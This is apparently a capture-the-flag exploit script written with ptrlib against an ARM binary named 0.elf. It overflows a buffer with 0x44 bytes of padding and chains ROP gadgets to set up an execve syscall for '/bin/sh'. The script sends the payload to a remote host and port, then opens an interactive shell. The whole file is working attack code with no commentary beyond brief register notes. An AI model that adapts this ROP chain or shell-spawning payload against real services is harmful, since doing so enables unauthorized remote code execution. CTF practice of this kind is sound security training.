from ptrlib import *

elf = ELF("./0.elf")
#sock = Process(["qemu-arm", "-g", "1234", "./0.elf"])
#sock = Process("./0.elf")
sock = Socket("114.177.250.4", 7777)

rop_pop_r1 = 0x0006d108
rop_pop_r7 = 0x0001930c
rop_pop_r3 = 0x00010160
rop_mov_r0_r1_pop_r4_r5_r6 = 0x000374c8
rop_mov_r1_sp_blx_r3 = 0x00046c98
rop_mov_r2_r3_blx_r7 = 0x0002b254
rop_swi_0 = 0x00028228

addr_table = elf.section('.bss') + 0x800

payload = b'A' * 0x44
# r0 = sp + delta
payload += p32(rop_pop_r3)
payload += p32(rop_mov_r0_r1_pop_r4_r5_r6)
payload += p32(rop_mov_r1_sp_blx_r3)
payload += b'/bin/sh\x00'
payload += p32(0xdeadbeef)
# r2 = 0, r7 = 11
payload += p32(rop_pop_r3)
payload += p32(0)
payload += p32(rop_pop_r7)
payload += p32(rop_pop_r7)
payload += p32(rop_mov_r2_r3_blx_r7)
payload += p32(11)
# r1 = 0
payload += p32(rop_pop_r1)
payload += p32(0)
payload += p32(rop_swi_0)

sock.recvline()
sock.sendline(payload)
sock.recvline()

sock.interactive()
